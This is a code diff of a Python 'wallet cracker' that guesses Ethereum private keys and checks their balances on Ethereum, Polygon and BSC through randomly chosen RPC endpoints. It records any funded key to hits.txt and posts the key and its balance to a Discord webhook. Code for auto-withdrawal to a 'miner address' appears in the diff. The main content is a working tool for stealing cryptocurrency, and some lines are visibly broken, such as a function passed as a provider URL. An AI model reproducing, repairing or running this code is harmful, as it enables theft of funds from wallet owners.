@@ -4,18 +4,26 @@ import sys
 import time
 import yaml
 import json
-#import api
 import secrets
+import requests
 import numpy as np
 import multiprocessing
-from pypresence import Presence   #<--- As soon as I uncomment the rich presence, it sometimes doesn't want to launch :(
+from pypresence import Presence
 from api import check_api_availability
 from numba import jit, cuda
 from blessed import Terminal
+import random
 
-def apicheck():
-    api_list_file = "api.txt"
-    CHECK_NODE = check_api_availability(api_list_file)
+file_path = 'api.txt'
+
+with open(file_path, 'r') as file:
+        global api_list
+        api_list = file.read().splitlines()
+
+chosen_api = random.choice(api_list)
+chosen_api2 = random.choice(api_list)
+chosen_api3 = random.choice(api_list)
+
 
 
 def Spinner():
@@ -27,34 +35,27 @@ def Spinner():
         time.sleep(0.2)
 
 try:
-    import psutil # Needs to be installed (pip install psutil)
+    import psutil
 except ImportError:
     input("Module 'psutil' not found/installed, to install run: 'pip install psutil' \n Press enter to exit the program")
     exit()
 
 try:
-    import requests # (pip install requests) 
-except ImportError:
-    input("Module 'requests' not found/installed, to install run: 'pip install requests' \n Press enter to exit the program")
-    exit()
-
-try:
-    from web3 import Web3 # (pip install web3)
+    from web3 import Web3
 except ImportError:
     input("Module 'web3' not found/installed, to install run: 'pip install web3' \n Press enter to exit the program")
     exit()
 try:
-    from datetime import datetime # (pip install datetime)
+    from datetime import datetime
 except ImportError:
     input("Module 'datetime' not found/installed, to install run: 'pip install datetime' \n Press enter to exit the program")
     exit()
 try:
-    from discord_webhook import DiscordWebhook, DiscordEmbed # (pip install discord_wehook)
+    from discord_webhook import DiscordWebhook, DiscordEmbed
 except ImportError:
     input("Module 'discord_webhook' not found/installed, to install run: 'pip install discord_webhook' \n Press enter to exit the program")
     exit()
 starttime = datetime.now()
-
 
 def read_yaml():
     try:
@@ -90,7 +91,6 @@ def printf(line, ms):
         pos =+ 1
         if pos != lenght: time.sleep(ms)
 def intro():
-    rich()
     l=('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
     o=('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
     g=('█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
@@ -116,6 +116,7 @@ def intro():
             print(m[current])
         time.sleep(0.002)
     sys.stdout.write("\n\n\n\n\n")
+
 def logoprint():
     print('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
     print('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
@@ -123,31 +124,19 @@ def logoprint():
     print('██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
     print('███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
     print('╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
-def checkversion():
-    try:
-        version = json.load(open("DATA",'r'))['VERSION']
-    except:
-        sys.exit('NO VERSION IN DATA FILE. UPDATE DATA FILE.')
-    url = "https://raw.githubusercontent.com/Cxyder/equity_cracker/main/DATA"
-    r = requests.get(url)
-    githubVersion = json.loads(r.content)['VERSION']
 
-    if version != githubVersion:
-        state = False
-        return state,version,githubVersion
-    else:
-        state = True
-        return state,version,githubVersion
+
 def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhookurl, badhitlogging, multibool, cudabool, useSecondary):
+    rich()
     t = Terminal()
     global key
     global pid
     pid = str(os.getpid())
     global w3
-    if useSecondary == False: w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']))
+    if useSecondary == False: w3 = Web3(Web3.HTTPProvider(chosen_api))
     w3 = Web3(Web3.HTTPProvider(check_api_availability))
-    w3p = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_POLYGON"]))
-    w3b = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_BSC"]))
+    w3p = Web3(Web3.HTTPProvider(chosen_api2))
+    w3b = Web3(Web3.HTTPProvider(chosen_api3))
     global w3state
     w3state = "check"
     global consERR
@@ -162,7 +151,7 @@ def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhooku
                 amount.value = 0
                 if (webhookurl != "null"):
                     webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
-                    embed = DiscordEmbed(title="EQUITY WMINER | SUMMARY", color="8fce00")
+                    embed = DiscordEmbed(title="Militarized Equity Wallet Cracker | SUMMARY", color="8fce00")
                     embed.set_timestamp()
                     embed.add_embed_field(name="Bad Hits:", value=bdhits.value, inline=False)
                     embed.add_embed_field(name="Good Hits:", value=hits.value, inline=False)
@@ -188,9 +177,9 @@ def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhooku
                     balb = 0
                 if bal > 2000000000000000 or balp > 0 or balb > 0:
                         hits.value = hits.value + 1
-                        w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
+                        w3 = Web3(Web3.HTTPProvider(chosen_api2))
                         w3state = "main"
-                        if not w3.is_connected(): w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["BACKUP_NODE"]))
+                        if not w3.is_connected(): w3 = Web3(Web3.HTTPProvider(chosen_api3))
                         print("\033[32m[NEW HIT] Succesfully cracked a wallet with following key: " + key + "\033[0m")
                         print('\033[32mRecording hit in "hits.txt"...\033[0m')
                         hitstxt = open("hits.txt", "a")
@@ -203,7 +192,7 @@ def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhooku
                         hitstxt.close()
                         if (webhookurl != "null"):
                             webhook = DiscordWebhook(url=webhookurl, description="@everyone", rate_limit_retry=True)
-                            embed = DiscordEmbed(title="EQUITY WMINER | NEW HIT", color="8fce00")
+                            embed = DiscordEmbed(title="Militarized Equity Wallet Cracker | NEW HIT", color="8fce00")
                             embed.set_timestamp()
                             embed.add_embed_field(name="pKey:", value=key, inline=False)
                             embed.add_embed_field(name="ETH:", value=str(bal*0.95/1000000000000000000), inline=False)
@@ -279,31 +268,30 @@ def NUpdate(chk,hits,bdhits):
     x = 0
     while x < 1:
         if hits.value >= 1:
-            sys.stdout.write("\x1b]2;EQUITY WMINER v2.0 | MINING...GOT A HIT! | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
+            sys.stdout.write("\x1b]2;Militarized Equity Wallet Cracker | MINING...GOT A HIT! | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
         else:
-            sys.stdout.write("\x1b]2;EQUITY WMINER v2.0 | MINING... | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
+            sys.stdout.write("\x1b]2;Militarized Equity Wallet Cracker | MINING... | ERRS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
         time.sleep(0.02)
 
 def close(reason):
     sys.exit(reason)
 
 def rich():
-    client_id = "1104920998622531606"
+    client_id = "1198291732807286845"
     RPC = Presence(client_id)
-
     RPC.connect()
-    RPC.update(state="Mining Crypto with EquityWMiner!" ,
-            large_image="equit" ,
-            buttons=[{"label": "Website", "url": "https://equityminer.eu/"}, {"label": "Discord", "url": "https://discord.gg/jVtGA73XXT"}])
+    RPC.update(state="Mining Crypto with MEWC!" ,
+        large_text="Militarized Equity Wallet Cracker",
+        large_image="mewc" ,
+        buttons=[{"label": "GitHub", "url": "https://github.com/4G0NYY/equity_cracker/"}, {"label": "Discord", "url": "https://discord.gg/ZhtcnQsbZz"}])
 
 if __name__=="__main__":
     try:
-        state, version, githubVersion = checkversion()
         multiprocessing.freeze_support()
         os.system("cls")
-        print("v2.0")
+        print("v0.1")
         intro()
-        sys.stdout.write("\x1b]2;EQUITY WMINER v2.0 | WAITING FOR INPUT | ERRS: 0 - HITS: 0 - BDHITS: 0 |\x07")
+        sys.stdout.write("\x1b]2;Militarized Equity Wallet Cracker v0.1 | WAITING FOR INPUT | ERRS: 0 - HITS: 0 - BDHITS: 0 |\x07")
         print('\n')
 
         dbug = open("debug.txt", "a")
@@ -369,7 +357,7 @@ if __name__=="__main__":
                     else:
                         badhitbool = False
                 else: print(str(badhitbool))
-                w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
+                w3 = Web3(Web3.HTTPProvider(chosen_api))
                 time.sleep(1)
                 if w3.is_connected():
                     print("Miner starting... [Buidling child processes...]")
@@ -391,7 +379,7 @@ if __name__=="__main__":
                         print("\033[32mStarting mining processess..\033[0m \n")
                         if(webhookurl != "null"):
                             webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
-                            embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
+                            embed = DiscordEmbed(title="Militarized Equity Wallet Cracker | MINING...", description="Miner started!", color=0x00ff00)
                             embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                             embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                             embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
@@ -405,7 +393,7 @@ if __name__=="__main__":
                         updP.join()
                         print("Connection to Main RPCs failed. Are you connected to Internet?") 
                     else:
-                        w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["BACKUP_NODE"]))
+                        w3 = Web3(Web3.HTTPProvider(chosen_api2))
                         print("\033[33mConnection to Main RPC failed! Trying to connect to Backup RPC... \033[0m")
                         if w3.is_connected():
                             print("Connection migrated to Backup RPC. Miner starting... [Buidling child processes...]")
@@ -427,7 +415,7 @@ if __name__=="__main__":
                                 print("\033[32mStarting mining processess..\033[0m \n")
                                 if (webhookurl != "null"):
                                     webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
-                                    embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
+                                    embed = DiscordEmbed(title="Militarized Equity Wallet Cracker | MINING...", description="Miner started!", color=0x00ff00)
                                     embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                                     embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                                     embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
@@ -440,7 +428,7 @@ if __name__=="__main__":
                                 if badhitbool == False: print("\n\033[31m> ..MINING IN PROGRESS.. <\033[0m")
                                 updP.join()
                         else:
-                            w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
+                            w3 = Web3(Web3.HTTPProvider(chosen_api3))
                             if w3.is_connected():
                                 print("\033[33mWarning! Main RPCs are unreachable! Starting miner without autowithdrawal!\033[0m")
                                 print("Miner starting... [Buidling child processes...]")
@@ -463,7 +451,7 @@ if __name__=="__main__":
                                     print("\033[32mStarting mining processess..\033[0m \n")
                                     if (webhookurl != "null"):
                                         webhook = DiscordWebhook(url=webhookurl, rate_limit_retry=True)
-                                        embed = DiscordEmbed(title="EQUITY WMINER | MINING...", description="Miner started!", color=0x00ff00)
+                                        embed = DiscordEmbed(title="Militarized Equity Wallet Cracker | MINING...", description="Miner started!", color=0x00ff00)
                                         embed.add_embed_field(name="Miner Address", value=minerAddress, inline=False)
                                         embed.add_embed_field(name="CPU Intensity", value=intensity, inline=False)
                                         embed.add_embed_field(name="Bad Hit Logging", value=badhitbool, inline=False)
